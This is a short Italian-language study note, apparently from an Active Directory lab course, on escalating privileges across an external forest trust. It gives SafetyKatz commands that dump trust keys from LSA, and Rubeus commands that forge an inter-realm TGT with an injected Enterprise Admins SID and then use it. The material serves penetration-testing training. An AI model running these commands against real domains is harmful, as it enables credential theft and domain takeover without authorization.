# Priv Esc - Across External Trust -

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Trust Key Abuse

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### SafetyKatz.exe

* Abbiamo bisogno della _Trust Key_ per il trust inter-forest del DC che ha _External Trust_

```powershell
SafetyKatz.exe -Command '"lsadump::trust /patch"'
```

Oppure

```powershell
SafetyKatz.exe -Command '"lsadump::lsa /patch"'
```

#### Rubeus.exe

* Forgiare un inter-realm TGT utilizzando Rubeus

```powershell
C:\AD\Tools\Rubeus.exe silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL
/rc4:17e8f4d3f4b46e95048a66a5dd890ee3 /sid:S-1-5-21-
719815819-3726368948-3917688648 /sids:S-1-5-21-
335606122-960912869-3279953914-519 /ldap
/user:Administrator /nowrap
```

* Utilizzare il ticket forgiato

```powershell
C:\AD\Tools\Rubeus.exe asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt
/ticket:<FORGED TICKET>
```
